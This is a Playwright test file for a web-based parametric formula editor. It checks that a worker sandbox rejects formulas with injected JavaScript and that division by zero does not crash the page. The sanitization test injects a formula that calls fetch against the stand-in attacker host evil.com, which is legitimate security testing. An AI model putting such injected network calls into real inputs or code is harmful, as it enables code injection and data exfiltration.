import { test, expect } from '@playwright/test';

test.describe('Security & Stability', () => {
  test.beforeEach(async ({ page }) => {
    await page.addInitScript(() => {
        window.__PLAYWRIGHT__ = true;
        window.__lastWorkerError = null;
        // Hook into the manager to capture worker errors directly
        const originalLog = console.error;
        console.error = (...args) => {
            // [cite: 2026-01-19] FIX: Scan all args for the error signature, as Debug.error shifts args
            const fullLog = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
            if (fullLog.includes('[Worker-Logic-Mismatch]')) {
                window.__lastWorkerError = "Security Violation"; // Flag detection
            }
            originalLog(...args);
        };
    });
    await page.goto('/');
    // [cite: 2026-01-24] STABILITY: Wait for "Hot" engine signal (First Frame Rendered)
    await page.waitForFunction(() => window.__PARAMETRIC_READY__ === true, { timeout: 90000 });
  });

  test('Sanitization: Should reject formulas containing malicious JS keywords', async ({ page }) => {
    // 🟢 Increases timeout to 90s for this specific test
    test.slow();
    
    const textarea = page.locator('.HUD_Textarea');
    await textarea.waitFor({ state: 'visible' });
    
    // [cite: 2026-01-23] FIX: Reset error state before attack to prevent race condition
    await page.evaluate(() => { window.__lastWorkerError = null; });

    // Attempt to access global scope or network
    // This should trigger the Worker's security guard or Syntax Error
    const maliciousCode = 'x = u; fetch("http://evil.com");';
    await textarea.fill(maliciousCode);

    // 1. Check UI Feedback (Symptom)
    const statusDot = page.locator('.HUD_Header .Status_Dot');
    await expect(statusDot).toHaveClass(/MathError|Invalid/);

    // 2. Check System Invariant (Root Cause)
    // Verify the worker actually rejected it with a security violation
    await expect(async () => {
        const error = await page.evaluate(() => window.__lastWorkerError);
        expect(error).toMatch(/Security Violation/);
    }).toPass({ timeout: 10000 });
  });

  test('Stability: Should handle Division by Zero gracefully', async ({ page }) => {
    const textarea = page.locator('.HUD_Textarea');
    await textarea.waitFor({ state: 'visible' });
    
    // Force Infinity
    await textarea.fill('x = 1/0; y = v; z = 0;');
    
    // The worker should catch this (Non-Finite warning) and the UI should remain responsive
    await page.waitForTimeout(500);
    const canvas = page.locator('canvas');
    await expect(canvas).toBeVisible();
  });
});